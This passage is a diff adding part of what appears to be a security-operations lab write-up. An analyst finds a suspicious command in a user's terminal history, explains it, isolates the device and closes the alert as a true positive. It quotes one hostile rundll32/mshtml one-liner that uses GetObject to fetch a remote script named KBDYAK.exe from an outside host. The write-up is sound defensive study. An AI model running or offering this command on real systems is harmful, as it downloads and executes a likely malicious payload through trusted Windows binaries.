@@ -40,3 +40,18 @@ Searching the username `EmilyComp` in the Endpoint Security and saw the history 
 ![Photo](Image/2/endpoint.png)
 ![Photo](Image/2/endpoint2.png)
 
+In terminal history:
+```
+rundll32.exe javascript:'../mshtml,RunHTMLApplication ';document.write();GetObject('script:http://ru-uid-507352920.pp.ru/KBDYAK.exe')'
+```
+This command is highly suspicious because it abuses the legitimate Windows executable rundll32.exe to invoke JavaScript through the mshtml component. It then uses GetObject() with a remote URL, indicating an attempt to retrieve or process content from an external host.
+
+The URL references a file named KBDYAK.exe, which may be a malicious payload. The command's structure is consistent with a technique used by attackers to leverage legitimate Windows components to initiate suspicious script activity and retrieve external content.
+
+## Step 6 - Contain The Device
+I Containment the device from the network isolated it to more investigation on the device 
+
+![Photo](Image/2/contain.png)
+
+Closed the alert as a True Positive.
+
